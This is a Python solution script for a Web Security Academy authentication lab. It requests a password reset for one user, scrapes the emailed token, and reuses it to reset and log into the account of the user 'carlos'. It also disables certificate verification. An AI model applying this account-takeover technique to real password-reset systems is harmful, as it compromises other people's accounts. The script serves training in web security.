#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import subprocess
from bs4 import BeautifulSoup
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Authentication Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net"
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
s = requests.Session()

# get hostname of exploit server
def exp_hostname(url):
    r = requests.get(url, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    for a in soup.find_all('a', href=True):
        if ('exploit' in a['href']):
            global hostname
            hostname = a['href']
            return hostname

def temp_token(hostname):
    r = s.get(hostname, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    for a in soup.find_all('a', href=True):
        if ('temp-forgot-password-token' in a['href']):
            global pwd_token, token
            pwd_token = a['href']
            token = pwd_token.split('=',2)[1]
            break

def carlos_pwd(url, pwd_token, token):
    s.get(pwd_token, verify=False)
    data = {
        'temp-forgot-password-token': token,
        'username': 'carlos',
        'new-password-1': 'test',
        'new-password-2': 'test'
    }
    s.post(pwd_token, data=data, verify=False)
    data1 = {
        'username': 'carlos',
        'password': 'test'
    }
    s.post(url + '/login', data=data1, verify=False)
    my_account = '/my-account'
    s.get(url + my_account, verify=False)
    print("(+) Authentication Successful!")
    print("Login with carlos:test")
    subprocess.call(["firefox", url + '/login'])

def pwd_reset(s, url):
    data ={
        "username": "wiener"
    }
    s.post(url + '/forgot-password', data=data, verify=False)

def main():
    
    print("(+) Exploiting Authentication")

    exp_hostname(url)

    pwd_reset(s, url)

    temp_token(hostname)

    carlos_pwd(url, pwd_token, token)

if __name__ == "__main__":
    main()
